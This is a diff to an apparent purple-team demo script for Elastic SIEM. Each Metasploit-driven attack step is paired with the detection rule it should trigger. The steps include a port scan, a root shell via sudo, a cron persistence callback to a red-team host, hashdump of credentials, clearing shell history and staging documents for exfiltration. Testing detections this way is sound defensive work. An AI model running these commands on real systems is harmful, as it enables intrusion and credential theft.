@@ -157,12 +157,15 @@ base: main
 # 1. Navigate to: Security → Rules → Detection rules (SIEM)
 # 2. Filter: Status = "Disabled", Tags contains "Linux"
 # 3. Enable these rules (bulk select):
-#    ☑ Linux System Information Discovery
-#    ☑ Persistence via Cron Job
-#    ☑ Potential Credential Access via /etc/shadow
-#    ☑ Suspicious Network Connection - Java Process
-#    ☑ Data Staging in Unusual Location
-#    ☑ Indicator Removal - Clear Command History
+#    ☑ Potential SYN-Based Port Scan Detected
+#    ☑ Potential Reverse Shell via Java  
+#    ☑ Linux System Information Discovery via Getconf
+#    ☑ Sudo Command Enumeration Detected
+#    ☑ Cron Job Created or Modified 
+#    ☑ Potential Shadow File Read via Command Line Utilities 
+#    ☑ Tampering of Shell Command-Line History
+#    ☑ Sensitive Files Compression
+#   
 # 4. Bulk actions → Enable
 # 5. View MITRE ATT&CK coverage map
 
@@ -173,6 +176,12 @@ base: main
 # Duration: 8-10 minutes
 # Goal: Trigger detections across multiple MITRE stages
 ################################################################################
+
+## 3.0 - Reconnaissance (Reconnaissance - T1046)
+# TCP port scan to identify open services
+nmap -sT -p 22,80,443,8080,8443 --open $BLUE_TEAM_IP
+
+# Detection: "Potential SYN-Based Port Scan Detected" (OOTB rule)
 
 ## 3.1 - Start Metasploit with pre-configured exploit
 msfconsole -r ~/elastic_demo.rc
@@ -203,7 +212,7 @@ sysinfo
 getuid
 
 # Detection: "Tomcat Manager Web Shell Deployment" (custom rule)
-# Detection: "Suspicious Java Child Process" (OOTB rule)
+# Detection: "Potential Reverse Shell via Java" (OOTB rule)
 
 ## 3.5 - Discovery commands (Discovery - T1082, T1033)
 shell
@@ -214,20 +223,29 @@ uname -a
 hostname
 cat /etc/passwd | grep -v nologin
 
+# Enumerate system configuration using getconf
+getconf -a
+getconf LONG_BIT
+getconf PAGE_SIZE
+
 exit
 
-# Detection: "Linux System Information Discovery"
+# Detection: "Linux System Information Discovery via Getconf" (OOTB rule)
 
 ## 3.6 - Privilege escalation (Privilege Escalation - T1548)
 shell
 
+# Enumerate sudo permissions
 sudo -l
+sudo -V
+
+# Escalate to root
 sudo /bin/bash
 whoami    # Should show 'root'
 
 exit
 
-# Detection: "Sudo Command Execution"
+# Detection: "Sudo Command Enumeration Detected" (OOTB rule)
 
 ## 3.7 - Establish persistence (Persistence - T1053.003)
 background
@@ -238,14 +256,14 @@ set LHOST $RED_TEAM_IP
 set LPORT 4445
 run
 
-# Detection: "Persistence via Cron Job"
+# Detection: "Cron Job Created or Modified" (OOTB rule)
 
 ## 3.8 - Credential dumping (Credential Access - T1003.008)
 use post/linux/gather/hashdump
 set SESSION 1
 run
 
-# Detection: "Potential Credential Access via /etc/shadow"
+# Detection: "Potential Shadow File Read via Command Line Utilities" (OOTB rule)
 
 ## 3.9 - View collected credentials
 loot
@@ -261,18 +279,24 @@ history -c
 
 exit
 
-# Detection: "Indicator Removal - Clear Command History"
+# Detection: "Tampering of Shell Command-Line History" (OOTB rule)
 
 ## 3.11 - Data staging (Collection - T1074.001)
 shell
 
+# Stage sensitive files in hidden directory
 mkdir /tmp/.staging
 find /home -name "*.pdf" -exec cp {} /tmp/.staging/ \; 2>/dev/null
+find /home -name "*.doc*" -exec cp {} /tmp/.staging/ \; 2>/dev/null
+find /etc -name "*.conf" -exec cp {} /tmp/.staging/ \; 2>/dev/null
+
+# Compress staged data for exfiltration
 tar -czf /tmp/data.tar.gz /tmp/.staging
+zip -r /tmp/backup.zip /tmp/.staging 2>/dev/null
 
 exit
 
-# Detection: "Data Staging in Unusual Location"
+# Detection: "Sensitive Files Compression" (OOTB rule)
 
 ## 3.12 - View MITRE ATT&CK coverage
 # In Elastic UI: Navigate to Alerts → MITRE ATT&CK view
@@ -289,11 +313,13 @@ exit
 # 1. Navigate to: Alerts
 # 2. Select multiple alerts:
 #    ☑ Tomcat Manager Web Shell Deployment
-#    ☑ Suspicious Java Child Process
-#    ☑ Linux System Information Discovery
-#    ☑ Persistence via Cron Job
-#    ☑ Potential Credential Access via /etc/shadow
-#    ☑ Indicator Removal - Clear Command History
+#    ☑ Potential Reverse Shell via Java
+#    ☑ Linux System Information Discovery via Getconf
+#    ☑ Sudo Command Enumeration Detected
+#    ☑ Cron Job Created or Modified
+#    ☑ Potential Shadow File Read via Command Line Utilities
+#    ☑ Tampering of Shell Command-Line History
+#    ☑ Sensitive Files Compression
 # 3. Click: "Add to case" → "Create new case"
 
 ## 4.2 - Fill case details
